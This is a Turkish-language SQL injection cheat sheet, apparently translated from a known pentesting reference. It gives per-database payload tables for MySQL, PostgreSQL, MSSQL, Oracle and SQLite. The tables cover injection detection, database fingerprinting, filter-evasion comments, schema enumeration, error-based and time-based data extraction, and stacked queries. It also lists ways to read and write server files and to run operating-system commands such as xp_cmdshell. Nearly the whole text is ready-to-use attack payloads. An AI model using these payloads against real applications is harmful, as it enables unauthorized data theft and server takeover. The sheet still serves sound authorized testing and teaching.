## İçindekiler

### Anahtar

Bazı payload'lar, kullanılmadan önce belirli değerlerle değiştirilmesi gereken yer tutucular içerir. Yer tutucular `<>` sembolleriyle belirtilmiştir ve büyük harflerle yazılmıştır (ör. `<START>`). Yer tutucunun tamamını (<> dahil) değiştirin.

## OR `<true>` (OR 1=1) Kullanımından Kaçınma

CTF'ler dışında, OR `<true>` ifadelerini içeren enjeksiyonlardan (ör. `' OR 1=1 -- -`) kaçınılmalıdır.

Bir "geçerli değer" bulunduğunda, SQL enjeksiyonları yaparken bir OR `<true>`'e gerek kalmaz. Geçerli bir değer, uygulamada "pozitif" bir sonuç döndüren bir değerdir (ör. birden fazla sonuç döndüren bir arama terimi veya bir kaynağa karşılık gelen bir ID).

---

### "Güvenli" OR Tabanlı Payload'lar

Bazı durumlarda "güvenli" OR tabanlı payload'lar kullanılabilir. Bu payload'lar, sorgu sonuçlarının yalnızca ilk satırını döndürmelidir.

| **Variant**  | **Payload**  | **Credit**  |
|--------------|--------------|-------------|
| **MySQL**    | `' OR IF((NOW()=SYSDATE()),SLEEP(1),1)='0` | Coffin |
| **PostgreSQL**| `' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1` | Tib3rius |
| **MSSQL**    | *No Known Payload* | - |
| **Oracle**   | `' OR ROWNUM = '1` | Richard Moore |
| **SQLite**   | `' OR ROWID = '1` | Tib3rius |

---

## Break & Repair Yöntemi

Temel SQL enjeksiyonlarını bulmak için güvenilir bir yöntem.

1. Geçerli bir değere tek tırnak ekleyerek ifadeyi "kırın" (ör. `username=admin'`).
2. Aşağıdaki "onarım" seçeneklerini sırayla deneyerek, biri orijinal cevabı döndürüyorsa enjeksiyonun mümkün olduğunu anlayabilirsiniz:

| **Onarım**      |
|------------------|
| `' '`           |
| `'||'`          |
| `'+'`           |
| `' AND '1'='1`  |
| `' -- -`        |

Eğer hiçbir onarım işe yaramazsa ve sayısal bir değere enjeksiyon yapıyorsanız şu yöntemleri deneyin:

| **Onarım**        |
|--------------------|
| ` -- -`           |
| ` AND 1=1`        |
| ` AND 1=1 -- -`   |

Örneğin, bir arama işlevinin `shirt` terimiyle 23 sonuç döndürdüğünü varsayalım. `shirt'` ile sorguyu bozun, ardından `shirt' '` gibi bir onarım ekleyin. Bu, enjeksiyon için bir açıklık olduğunu gösterebilir.

---

## Veritabanı Türlerini Belirleme

Potansiyel bir enjeksiyon bulunduğunda, aşağıdaki payload'ları sırasıyla enjekte ederek pozitif sonuç dönen veritabanı türünü belirleyebilirsiniz:

| **Sıra** | **Payload**                     | **Geçerliyse** |
|----------|---------------------------------|----------------|
| 1        | `AND 'foo' 'bar' = 'foobar'`   | MySQL          |
| 2        | `AND DATALENGTH('foo') = 3`    | MSSQL          |
| 3        | `AND TO_HEX(1) = '1'`          | PostgreSQL     |
| 4        | `AND LENGTHB('foo') = '3'`     | Oracle         |
| 5        | `AND GLOB('foo*', 'foobar') = 1`| SQLite        |

---

## Yorum Eklemeleri

SQL ifadelerine yorum eklemek için kullanılabilecek sözdizimi. Filtreleri atlatmak ve enjeksiyonları gizlemek için faydalıdır.

| **Variant** | **Sözdizimi** |
|-------------|---------------|
| MySQL       | `# yorum`<br>`-- yorum`<br>`/*yorum*/` |
| PostgreSQL  | `-- yorum`<br>`/*yorum*/` |
| MSSQL       | `-- yorum`<br>`/*yorum*/` |
| Oracle      | `-- yorum`<br>`/*yorum*/` |
| SQLite      | `-- yorum`<br>`/*yorum*/` |

---

## Karakter Uzunlukları ve Concatenation

### Uzunluk Fonksiyonları

| **Variant** | **Fonksiyon**              | **Açıklama**                       |
|-------------|----------------------------|-------------------------------------|
| MySQL       | `LENGTH('foo')`           | Bayt sayısını sayar                |
| PostgreSQL  | `LENGTH('foo')`           | Unicode karakterlerini sayar       |
| MSSQL       | `DATALENGTH('foo')`       | Bayt sayısını sayar                |
| Oracle      | `LENGTHB('foo')`          | Bayt sayısını sayar                |
| SQLite      | `LENGTH('foo')`           | Unicode karakterlerini sayar       |

### String Birleştirme Fonksiyonları

| **Variant** | **Fonksiyon / Operatör**    |
|-------------|----------------------------|
| MySQL       | `'foo' 'bar'`<br>`CONCAT('foo', 'bar')` |
| PostgreSQL  | `'foo'||'bar'`<br>`CONCAT('foo', 'bar')` |
| MSSQL       | `'foo'+'bar'`<br>`CONCAT('foo', 'bar')` |
| Oracle      | `'foo'||'bar'`<br>`CONCAT('foo', 'bar')` |
| SQLite      | `'foo'||'bar'`<br>`CONCAT('foo', 'bar')` |

---

## Substrings
Bu işlevler, bir dizenin alt dizisini seçmek için kullanılabilir. ALTBAŞLANGIÇ (START) değeri, alt diziyi ilk karakterden başlatmak için 1 olarak ayarlanmalıdır (0 değil). Bazı WAF'leri / filtrelemeleri atlatmak için virgülsüz sürümler de dahildir.

| Variant       | Function                                        | Notes |
|---------------|-------------------------------------------------|-------|
| **MySQL**    | `SUBSTRING('foobar', <START>, <LENGTH>)`        |       |
|               | `SUBSTR('foobar', <START>, <LENGTH>)`          |       |
|               | `MID('foobar', <START>, <LENGTH>)`             |       |
|               | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` | SUBSTR ve MID bu virgülsüz sürüm için de kullanılabilir. |
| **PostgreSQL** | `SUBSTRING('foobar', <START>, <LENGTH>)`       |       |
|               | `SUBSTR('foobar', <START>, <LENGTH>)`          |       |
|               | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |       |
| **MSSQL**    | `SUBSTRING('foobar', <START>, <LENGTH>)`        |       |
| **Oracle**   | `SUBSTR('foobar', <START>, <LENGTH>)`           |       |
| **SQLite**   | `SUBSTRING('foobar', <START>, <LENGTH>)`        |       |
|               | `SUBSTR('foobar', <START>, <LENGTH>)`          |       |

## Length
Bu işlevler, bir dizenin uzunluğunu bayt veya karakter cinsinden sayar (Unicode sayesinde bazı karakterlerin birden fazla bayta sahip olabileceği dikkate alınır).

| Variant       | Function                        | Notes |
|---------------|---------------------------------|-------|
| **MySQL**    | `LENGTH('foo')`                | Bayt sayısını sayar |
|               | `CHAR_LENGTH('foo')`          | Çok baytlı karakterler dahil olmak üzere karakter sayısını sayar |
| **PostgreSQL** | `LENGTH('foo')`               | Çok baytlı karakterler dahil olmak üzere karakter sayısını sayar |
| **MSSQL**    | `DATALENGTH('foo')`            | Bayt sayısını sayar |
|               | `LEN('foo')`                  | Çok baytlı karakterler dahil olmak üzere karakter sayısını sayar |
| **Oracle**   | `LENGTHB('foo')`               | Bayt sayısını sayar |
|               | `LENGTH('foo')`               | Çok baytlı karakterler dahil olmak üzere karakter sayısını sayar |
| **SQLite**   | `LENGTH('foo')`                | Çok baytlı karakterler dahil olmak üzere karakter sayısını sayar |

## Group Concatenation
Birden fazla satırdaki değerleri tek bir dize olarak birleştiren işlevler. `<DELIMITER>` yerine istediğiniz ayırıcı karakteri veya dizeyi yerleştirin (örneğin, virgül).

| Variant       | Function                                |
|---------------|-----------------------------------------|
| **MySQL**    | `GROUP_CONCAT(expression, '<DELIMITER>')` |
| **PostgreSQL** | `STRING_AGG(expression, '<DELIMITER>')` |
| **MSSQL**    | `STRING_AGG(expression, '<DELIMITER>')` |
| **Oracle**   | `LISTAGG(expression, '<DELIMITER>')`    |
| **SQLite**   | `GROUP_CONCAT(expression, '<DELIMITER>')` |

## Karakterleri Karşılaştırmak için Tam Sayılara Dönüştürme
Kör SQL enjeksiyonlarında bir karakterin hangi aralıkta olduğunu belirlemek için faydalıdır. MySQL ve Oracle'ın işlevleri onaltılık bir sayı döndürürken diğerleri ondalık bir sayı döndürür.

| Variant       | Function       | Output |
|---------------|----------------|--------|
| **MySQL**    | `HEX('a')`     | 61     |
| **PostgreSQL** | `ASCII('a')`  | 97     |
| **MSSQL**    | `UNICODE('a')` | 97     |
| **Oracle**   | `RAWTOHEX('a')` | 61     |
| **SQLite**   | `UNICODE('a')` | 97     |

## Sorguları Sınırlandırma ve Ofsetleme
Sorgu sonuçlarını belirli bir satır sayısı ile sınırlamak ve başlangıç satırını ofsetlemek için kullanılan sözdizimleri. Bazı WAF'leri / filtrelemeleri atlatmak için virgülsüz sürümler de dahildir.

| Variant       | Limit Query Result to 1 Row            | Limit to 1 Row, Starting at Row 5     |
|---------------|----------------------------------------|----------------------------------------|
| **MySQL**    | `SELECT * FROM users LIMIT 1`          | `SELECT * FROM users LIMIT 4, 1`      |
|               |                                        | `SELECT * FROM users LIMIT 1 OFFSET 4` |
| **PostgreSQL** | `SELECT * FROM users LIMIT 1`         | `SELECT * FROM users LIMIT 1 OFFSET 4` |
| **MSSQL**    | `SELECT * FROM users ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY` | `SELECT * FROM users ORDER BY 1 OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY` |
| **Oracle >= v12** | `SELECT * FROM users FETCH NEXT 1 ROWS ONLY` | `SELECT * FROM users OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY` |
| **Oracle <= v11** | `SELECT * FROM users WHERE ROWNUM = 1` | `SELECT * FROM users WHERE ROWNUM = 5` |
| **SQLite**   | `SELECT * FROM users LIMIT 1`          | `SELECT * FROM users LIMIT 4, 1`      |
|               |                                        | `SELECT * FROM users LIMIT 1 OFFSET 4` |

## Veritabanı Sürümü

Veritabanı sürüm bilgilerini sağlayan fonksiyonlar ve operatörler.

| Varyant      | Fonksiyon / Operatör                          |
|--------------|-----------------------------------------------|
| **MySQL**    | `@@VERSION`<br>`VERSION()`<br>`@@GLOBAL.VERSION` |
| **PostgreSQL** | `VERSION()`                                   |
| **MSSQL**    | `@@VERSION`                                   |
| **Oracle**   | `SELECT BANNER FROM v$version WHERE ROWNUM = 1`<br>`SELECT BANNER FROM gv$version WHERE ROWNUM = 1` |
| **SQLite**   | `sqlite_version()`                            |

## Mevcut Veritabanı / Şema

Seçili veritabanı veya şemayı döndüren sorgular.

| Varyant      | Sorgu                                         |
|--------------|-----------------------------------------------|
| **MySQL**    | `SELECT DATABASE()`                          |
| **PostgreSQL** | `SELECT CURRENT_DATABASE()`<br>`SELECT CURRENT_SCHEMA()` |
| **MSSQL**    | `SELECT DB_NAME()`<br>`SELECT SCHEMA_NAME()` |
| **Oracle**   | `SELECT name FROM V$database`<br>`SELECT * FROM global_name`<br>`SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |
| **SQLite**   | N/A                                           |

## Veritabanlarını Listeleme

Tüm veritabanlarını veya şemaları listeleyen sorgular.

| Varyant      | Sorgu                                         |
|--------------|-----------------------------------------------|
| **MySQL**    | `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA`<br>`SELECT db FROM mysql.db` |
| **PostgreSQL** | `SELECT datname FROM pg_database`<br>`SELECT DISTINCT(schemaname) FROM pg_tables` |
| **MSSQL**    | `SELECT name FROM master.sys.databases`<br>`SELECT name FROM master..sysdatabases` |
| **Oracle**   | `SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)` |
| **SQLite**   | N/A                                           |

## Tabloları Listeleme

Belirli bir veritabanındaki / şemadaki tüm tabloları listeleyen sorgular.

| Varyant      | Sorgu                                         |
|--------------|-----------------------------------------------|
| **MySQL**    | `SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DBNAME>'`<br>`SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='<DBNAME>'` |
| **PostgreSQL** | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'`<br>`SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
| **MSSQL**    | `SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'`<br>`SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'` |
| **Oracle**   | `SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'` |
| **SQLite**   | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |

## Sütunları Listeleme

Belirli bir tablo ve veritabanı / şema için tüm sütunları listeleyen sorgular.

| Varyant      | Sorgu                                         |
|--------------|-----------------------------------------------|
| **MySQL**    | `SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE_NAME>' AND table_schema='<DBNAME>'` |
| **PostgreSQL** | `SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='<DBNAME>' AND table_name='<TABLE_NAME>'` |
| **MSSQL**    | `SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)` |
| **Oracle**   | `SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'` |
| **SQLite**   | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'`<br>`SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |

## Boolean Hata Tabanlı İstismar

1=1 koşulu doğruysa SQL'de bir hataya neden olan payload'lar. Koşulu istediğiniz bir durumla değiştirin. Hata geri dönerse, koşul doğrudur.

| Varyant      | Payload                                       |
|--------------|-----------------------------------------------|
| **MySQL**    | `AND 1=(SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),1))` |
| **PostgreSQL** | `AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INTEGER) ELSE 1 END)` |
| **MSSQL**    | `AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)` |
| **Oracle**   | `AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)` |
| **SQLite**   | `AND 1=(SELECT CASE WHEN (1=1) THEN load_extension(1) ELSE 1 END)` |
# Error Based Exploitation

Bu enjeksiyon yükleri, bir veritabanı hatasına neden olmalı ve bu hata içinde kullanılan veritabanı sürümü bilgisini döndürmelidir.

## MySQL
### Payload
```sql
AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
```

## PostgreSQL
### Payload
```sql
AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -
AND (CAST('~'||(SELECT version())::text||'~' AS NUMERIC)) -- -
AND CAST((SELECT version()) AS INT)=1337 -- -
AND (SELECT version())::int=1 -- -
```

## MSSQL
### Payload
```sql
AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
```

## Oracle
### Payload
```sql
AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))||'~'||CHR(62))) FROM DUAL) -- -
AND 1337=UTL_INADDR.GET_HOST_ADDRESS('~'||(SELECT banner FROM v$version)||'~') -- -
AND 1337=CTXSYS.DRITHSX.SN(1337,'~'||(SELECT banner FROM v$version)||'~') -- -
AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -
```

# Time Based Exploitation

## Basit Zaman Tabanlı Enjeksiyonlar
Bu enjeksiyon yükleri, sorguda değerlendirilen her satır için veritabanının 10 saniye uyumasına neden olabilir. Yalnızca sorgunun yalnızca bir satırı değerlendireceğinden eminseniz kullanılmalıdır.

### Variant: Payload
- **MySQL**: `AND SLEEP(10)=0`
- **PostgreSQL**: `AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'`
- **MSSQL**: `AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)`
- **Oracle**: `AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)`
- **SQLite**: `AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))`

## Karmaşık Zaman Tabanlı Enjeksiyonlar
Bu enjeksiyon yükleri yalnızca bir kez uykuya neden olur (10 saniye). Eğer 1=1 koşulu doğruysa, 10 saniyelik bir gecikme meydana gelir.

### Variant: Payload
- **MySQL**: `AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)`
- **PostgreSQL**: `AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)`
- **MSSQL**: `AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)`
- **Oracle**: `AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)`
- **SQLite**: `AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)`

# Stack Based Injection
Bu enjeksiyonlar genellikle zaman gecikmesi ile tespit edilir ve 10 saniye uykuya neden olur.

### Variant: Payload
- **MySQL**: `; SLEEP(10) -- -`
- **PostgreSQL**: `; PG_SLEEP(10) -- -`
- **MSSQL**: `; WAITFOR DELAY '0:0:10' -- -`
- **Oracle**: `; DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) -- -`
- **SQLite**: `; RANDOMBLOB(1000000000/2) -- -`

# Dosya Okuma
Yerel dosyaların içeriğini okumak için kullanılan yöntemler aşağıda verilmiştir.

### Variant: Function
- **MySQL**: `LOAD_FILE('/path/to/file')`
- **PostgreSQL**: `PG_READ_FILE('/path/to/file')`
- **MSSQL**: `OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)`
- **Oracle**: `utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)`
- **SQLite**: `readfile('/path/to/file')`

# Dosya Yazma
Yerel dosyalara içerik yazmak için kullanılan yöntemler aşağıda verilmiştir.

### Variant: Statement
- **MySQL**: `SELECT 'contents' INTO OUTFILE '/path/to/file'`
- **PostgreSQL**: `COPY (SELECT 'contents') TO '/path/to/file'`
- **MSSQL**: `execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'`
- **Oracle**: `utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)`
- **SQLite**: `SELECT writefile('/path/to/file', column_name) FROM table_name`

# OS Komutlarını Çalıştırma
Yerel işletim sistemi komutlarını çalıştırmak için kullanılan yöntemler aşağıda verilmiştir.

### Variant: Statement
- **MySQL**: `Not Possible`
- **PostgreSQL**: `COPY (SELECT '') to program '<COMMAND>'`
- **MSSQL**: `EXEC xp_cmdshell '<COMMAND>'`
- **Oracle**: `SELECT os_command.exec_clob('<COMMAND>') cmd from dual`
  ```
  DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
  ```
- **SQLite**: `Not Possible`
